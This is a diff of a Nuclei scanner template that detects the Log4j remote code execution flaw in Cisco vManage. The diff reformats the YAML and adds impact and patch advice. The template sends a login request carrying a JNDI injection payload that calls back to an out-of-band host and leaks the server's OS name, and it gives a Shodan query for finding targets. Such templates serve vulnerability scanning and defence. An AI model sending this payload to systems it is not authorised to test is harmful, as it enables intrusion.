@@ -1,14 +1,15 @@
 id: cisco-vmanage-log4j
-
 info:
   name: Cisco vManage (Log4j) - Remote Code Execution
   author: DhiyaneshDK
   severity: critical
-  description: Cisco vManage is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. More information is available in the cisco-sa-apache-log4j-qRuKNEbd advisory.
+  description: Cisco vManage is vulnerable to remote code execution through the Log4j
+    framework, which can give attackers unauthorized access to sensitive information
+    and complete control over a compromised system.
   reference:
-    - https://www.tenable.com/plugins/nessus/161212
-    - https://logging.apache.org/log4j/2.x/security.html
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - https://www.tenable.com/plugins/nessus/161212
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
@@ -16,47 +17,52 @@ info:
     cwe-id: CWE-77
   metadata:
     shodan-query: title:"vManage"
-    verified: "true"
+    verified: 'true'
+    impact: The vulnerability in Cisco vManage (Log4j) could have a significant impact,
+      allowing attackers to execute malicious code, steal sensitive data and gain
+      control over compromised systems without proper authentication.
+    recommendation: It is recommended that Cisco vManage users apply the necessary
+      security patches provided by the company to prevent the risk of remote code
+      execution attacks.
   tags: log4j,cisco,tenable,cve,cve2021,rce,jndi,kev,oast
-
 requests:
-  - raw:
-      - |
-        @timeout: 20s
-        POST /j_security_check HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        Origin: {{BaseURL}}
-        Referer: {{BaseURL}}
+- raw:
+  - '@timeout: 20s
 
-        j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin&submit=Log+In
+    POST /j_security_check HTTP/1.1
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
-        words:
-          - "dns"
+    Host: {{Hostname}}
 
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+    Content-Type: application/x-www-form-urlencoded
 
-      - type: word
-        part: body
-        words:
-          - '<title>Cisco vManage</title>'
+    Origin: {{BaseURL}}
 
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip # Print remote interaction IP in output
+    Referer: {{BaseURL}}
 
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
 
-# Enhanced by CS 03/27/2023
+    j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin&submit=Log+In
+
+    '
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - dns
+  - type: regex
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
+  - type: word
+    part: body
+    words:
+    - <title>Cisco vManage</title>
+  extractors:
+  - type: kval
+    kval:
+    - interactsh_ip
+  - type: regex
+    part: interactsh_request
+    group: 1
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
